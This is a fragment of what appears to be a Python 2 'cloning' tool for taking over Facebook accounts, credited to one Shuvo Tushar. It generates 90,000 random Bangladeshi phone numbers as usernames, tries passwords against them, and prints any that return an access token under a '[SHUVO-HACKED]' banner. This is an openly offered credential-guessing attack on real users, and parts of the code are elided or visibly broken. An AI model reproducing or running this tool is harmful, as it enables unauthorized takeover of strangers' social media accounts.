...
\033[0;94m   _____ _   _ _   _ _   _  _____ 
\033[0;94m /  ___| | | | | | | | | ||  _  |
\033[0;96m   \ `--.| |_| | | | | | | || | | |
\033[0;96m    `--. \  _  | | | | | | || | | |
\033[0;96m   /\__/ / | | | |_| \ \_/ /\ \_/ /
\033[0;96m  \____/\_| |_/\___/ \___/  \___/ 
""")

print("\033[0;91mThis Tool's Free By Shuvo tushar")

psb('\x1b[1;92mBANGLADESH 6 DIGIT CLONING START PLEASE WAIT .....')
for n in range(90000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr +8801836524171
    sys.stdout.flush()
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : SHUVO TUSHAR'
    print '\033[0;94mFACEBOOK : ABDUL KADER SHUVO'
    print '\033[0;96mGITHUB   : Shuvotushar'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[SHUVO-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
